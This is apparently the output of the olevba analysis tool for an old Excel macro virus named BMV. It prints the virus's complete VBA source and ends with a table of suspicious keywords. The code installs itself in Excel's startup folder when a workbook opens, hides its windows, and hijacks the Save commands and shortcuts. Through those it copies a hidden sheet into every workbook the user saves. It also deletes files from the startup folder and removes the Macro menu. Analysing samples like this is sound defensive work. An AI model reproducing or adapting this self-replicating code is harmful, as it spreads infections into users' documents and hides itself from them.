olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.BMV-5d44d36a2343b51f5949f35aaab6e8456c0719b1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO BMV.bas 
in file: Virus.MSExcel.BMV-5d44d36a2343b51f5949f35aaab6e8456c0719b1 - OLE stream: '_VBA_PROJECT_CUR/VBA/BMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Const strToolbar = "Standard"
Const strButtonName = "Save"
Const iButtonID = 2

Dim NewVersionInstalled As Boolean
Dim SameVersionInstalled As Boolean

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo StartUp
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    CheckVersion
    If NewVersionInstalled Then
        GoTo X
    Else
        If SameVersionInstalled Then
            n = ActiveWorkbook.Name
            GoTo X
        ElseIf NewVersion = False And SameVersion = False Then
            RemoveTheOthers
            GoTo I
        End If
    End If
I:
    fname = ActiveWorkbook.Name
    Sheets("BMV").Copy
    ActiveWorkbook.SaveAs _
       Filename:=Application.Path + "\XlStart\BMV.xls", _
       FileFormat:=xlNormal, password:="", WriteResPassword:="", _
       ReadOnlyRecommended:=False, CreateBackup:=False
    Windows("BMV").Activate
    ActiveWindow.Visible = False
    Workbooks("BMV").Save
    GoTo Z
StartUp:
    If Windows.Count = 1 Then
        Add_BMV_Button
        Add_BMV_Menus
        BMV_Action
    Else
        ActiveWindow.Close
    End If
Z:
If Workbooks.Count <= 1 Then
    Workbooks.Add
End If
X:
    Application.DisplayAlerts = True
End Sub


Private Sub Add_BMV_Button()
    Application.ScreenUpdating = False
    Set btns = Toolbars(strToolbar).ToolbarButtons
    Set btn = ButtonsIndex(btns, "Save")
    If Not (btn Is Nothing) Then
        btn.Delete
        Set btns = Toolbars(strToolbar).ToolbarButtons
        Set btn = ButtonsIndex(btns, strButtonName)
    End If
    iLoc = ButtonsLoc(btns, "Open")
    If iLoc = 0 Then
        Set btn = btns.Add(iButtonID)
    Else
        Set btn = btns.Add(iButtonID, iLoc + 2)
    End If
    btn.Name = strButtonName
    btn.OnAction = "BMV_Save"
End Sub


Private Function ButtonsIndex(ByVal Buttons As Object, ByVal bname As String) As Object
    For Each btn In Buttons
        If btn.Name = bname Then
            Set ButtonsIndex = btn
            Exit For
        End If
    Next
End Function


Private Function ButtonsLoc(ByVal Buttons As Object, ByVal bname As String) As Integer
    n = Buttons.Count
    For I = 1 To n
        If Buttons(I).Name = bname Then
            ButtonsLoc = 1
            Exit For
        End If
    Next
End Function


Sub Add_BMV_Menus()
Attribute Add_BMV_Menus.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Z
    MenuBars(xlWorksheet).Menus("File").MenuItems("Save &As...").Delete
    MenuBars(xlWorksheet).Menus("File").MenuItems _
       .Add Caption:="Save &As...", _
       OnAction:="BMV_FileSaveAs", _
       Before:="Save &Workspace...", _
       StatusBar:="Saves document with new name, file format or password..."

    MenuBars(xlWorksheet).Menus("File").MenuItems("&Save").Delete
    MenuBars(xlWorksheet).Menus("File").MenuItems _
      .Add Caption:="&Save...", OnAction:="BMV_Save", _
       ShortcutKey:="^{s}", _
      Before:="Save &As...", _
      StatusBar:="Saves document..."
      
    MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
Z:
End Sub


Sub BMV_Save()
Attribute BMV_Save.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    Select Case LCase(TypeName(ActiveSheet))
        Case "worksheet"
            If ActiveWorkbook.Path = "" Then
                BMV_FileSaveAs
            Else
                BMV_FileSave
            End If
        Case Else
            Beep
            MsgBox "Save failed...", vbCritical
    End Select
    Application.ScreenUpdating = True
End Sub


Sub BMV_FileSaveAs()
Attribute BMV_FileSaveAs.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    If ActiveSheet.Name <> "" Then
        On Error GoTo Z
        fsave = Application _
                .Dialogs(xlDialogSaveAs).Show
        If fsave <> False Then
            BMV_FileSave
        End If
    End If
Z:
If Windows("BMV").Visible = True Then Windows("BMV").Visible = False
End Sub


Sub BMV_FileSave()
Attribute BMV_FileSave.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    If ActiveSheet.Name <> "" Then
        On Error GoTo Z
        Application.DisplayAlerts = False
        Application.ScreenUpdating = False
        fname = ActiveWorkbook.Name
        Check_BMV
        sc = ActiveWorkbook.Sheets.Count
        Windows("BMV").Activate
        Sheets("BMV").Copy After:=Workbooks(fname).Sheets(sc)
        ActiveWindow.SelectedSheets.Visible = False
        Windows("BMV").Visible = False
        Workbooks("BMV").Save
        ActiveWorkbook.Save
    End If
Z:
If Windows("BMV").Visible = True Then Windows("BMV").Visible = False
End Sub


Sub Check_BMV()
Attribute Check_BMV.VB_ProcData.VB_Invoke_Func = " \n14"
    sc = ActiveWorkbook.Sheets.Count
    For a = 1 To sc
        If Sheets(a).Name = "BMV" Then
            Sheets("BMV").Delete
        End If
    Next a
End Sub


Function VerNum()
Attribute VerNum.VB_ProcData.VB_Invoke_Func = " \n14"
    VerNum = 2
End Function


Sub CheckVersion()
Attribute CheckVersion.VB_ProcData.VB_Invoke_Func = " \n14"
Dim NumFile
Dim Version
    NumFile = FreeFile()
    On Error Resume Next
    Open Application.Path + "\Version.Txt" For Input As NumFile
    If Err <> 0 Then
        Open Application.Path + "\Version.Txt" For Output As NumFile
        Print #NumFile, VerNum
        Close #NumFile
        NewVersionInstalled = False
        SameVersionInstalled = False
    Else
        Input #NumFile, Version
        Close #NumFile
        If Version > VerNum Then
            NewVersionInstalled = True
            SameVersionInstalled = False
        ElseIf Version = VerNum Then
            NewVersionInstalled = False
            SameVersionInstalled = True
        ElseIf Version < VerNum Then
            Open Application.Path + "\Version.Txt" For Output As NumFile
            Print #NumFile, VerNum
            Close #NumFile
            NewVersionInstalled = False
            SameVersionInstalled = False
        End If
    End If
End Sub


Sub RemoveTheOthers()
Attribute RemoveTheOthers.VB_ProcData.VB_Invoke_Func = " \n14"
Dim a As Integer
Dim p As String
Dim fn As String
Dim v As Boolean
    On Error Resume Next
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    For a = 1 To Windows.Count
        p = Application.Path + "\XlStart\"
        fn = p + Workbooks(a).Name
        v = Windows(a).Visible
        If v = False Then
            Windows(a).Visible = True
            Workbooks(a).Save
            ActiveWindow.Close
            Kill fn
        End If
    Next
End Sub


Sub BMV_Action()
Attribute BMV_Action.VB_ProcData.VB_Invoke_Func = " \n14"
Dim NumFile As Integer
    NumFile = FreeFile()
    Application.OnKey "{F1}", "BMV_Help"
    Application.OnKey "^{s}", "BMV_Save"
    Application.OnKey "{F12}", "BMV_FileSaveAs"
    If Day(Now()) = 1 And Month(Now()) = 6 Then
        Application.OnEntry = "BMV_Entry"
        MsgBox "Today is my girl's birthday." + Chr$(13) + "So, say hello to her!", vbInformation
    End If
    On Error GoTo Z

Z:
End Sub


Sub BMV_Entry()
Attribute BMV_Entry.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Z
   Application.ActiveWindow.Caption = ActiveCell.Value
Z:
End Sub


Sub BMV_Help()
Attribute BMV_Help.VB_ProcData.VB_Invoke_Func = " \n14"
    MsgBox "This program is dedicated to " + Application.UserName + Chr$(13) + _
           "from " + Application.OrganizationName + Chr$(13) + _
           "with serial number : BMV2909-91" + Trim(Str$(VerNum)), _
           vbInformation
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  Sophos 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  BM
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

